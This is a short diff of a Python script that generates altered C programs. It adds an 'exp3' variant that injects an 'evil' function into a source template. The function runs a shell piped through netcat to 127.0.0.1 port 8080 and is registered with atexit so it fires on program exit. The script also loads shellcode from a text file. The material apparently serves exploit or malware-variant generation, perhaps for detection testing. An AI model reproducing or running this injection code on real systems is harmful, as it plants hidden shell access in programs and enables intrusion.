@@ -65,7 +65,24 @@ void evil(){
     evil_code+= f2[ret_place:]
     return evil_code
 
-exploit_list = [exp1,exp2]
+def exp3(s):
+    
+    evil_code = f2[:main_place]
+    evil_code+= """
+void evil(){
+    system(\"/bin/sh | nc 127.0.0.1 8080\");
+    return;
+}
+
+"""
+    evil_code+= f2[main_place:ret_place]
+    evil_code+= '\natexit(evil);\n'
+    evil_code+= f2[ret_place:]
+    return evil_code
+
+
+
+exploit_list = [exp1,exp2,exp3]
 s = open("shellcode1.txt","r").read()
 s = s.split('unsigned char buf[] =')[1:]
 s = [i.split(';')[0] for i in s]
